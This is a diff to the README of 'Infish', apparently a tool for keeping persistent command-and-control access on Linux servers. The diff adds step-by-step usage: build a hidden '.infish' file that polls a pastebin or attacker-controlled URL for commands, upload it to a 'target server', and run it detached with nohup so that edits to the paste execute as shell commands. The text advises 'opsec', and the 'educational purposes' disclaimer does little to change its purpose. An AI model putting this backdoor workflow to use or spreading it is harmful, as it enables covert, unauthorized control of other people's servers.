@@ -1,6 +1,6 @@
 # Infish
 
-Infish stands for infinite shell. It's a way to maintain persistent shell access on a linux server even without ftp, ssh, or cpanel access. It works on all linux servers, even on shared hosting.
+Infish stands for infinite shell. It's a way to maintain persistent shell access (command and control) on a linux server even without ftp, ssh, or cpanel access. It works on all linux servers, even on shared hosting.
 
 Note that this project is for **educational purposes** only. I bear no responsibility for how you use it. For this reason, no specific tutorial will be given for how exactly when or where to use this tool.
 
@@ -18,17 +18,22 @@ There are two ways to build the final product.
 - Using a raw paste url (or a website you control. Observe opsec though.)
 - Using your pastebin dev api key, username, and password
 
+However, you first need to clone this repository or copy the infis-builder file to your local machine. Make it executable by running  
+
+```bash
+$ chmod +x infish-builder
+```
 
 ## Using a raw url
 
 This is when you already have a webpage (observe opsec) or have already created a paste by hand. Get the **raw paste url** or the url or the page and run the following command
 
 ```bash
-bash infish-builder url pastebin.com/raw/abc123
+$ ./infish-builder url pastebin.com/raw/abc123
 ```
 
 ```bash
-bash infish-builder url somesite.com/cmdpage
+$ ./infish-builder url somesite.com/cmdpage
 ```
 **You can also use this is you have a url you host on the internet**.
 
@@ -43,7 +48,7 @@ This is the recommended method, as everything is automated. For this, obtain the
 Then run the following
 
 ```bash
->bash infish-builder key xxxxxxxxxxxxxxxxxxxxxxx
+$ ./infish-builder key xxxxxxxxxxxxxxxxxxxxxxx
 Pastebin username:
 john
 Pastebin password:
@@ -53,14 +58,26 @@ shell
 
 Successfully built infinite shell
 
+$
 ```
 
-A file called '.infish' is created.
+A file called '.infish' is created. It will contain something like this   
 
-Finally on the server, run
 
 ```bash
-nohup bash .infish & disown
+
+```
+
+Finally, upload it to the target server and there, make it executable by running   
+
+```bash
+$ chmod +x .infish
+```
+
+Then to begin c&c, run  
+
+```bash
+$ nohup ./.infish & disown
 ```
 
 Now, you can edit your paste to any shell command and the server will run it.
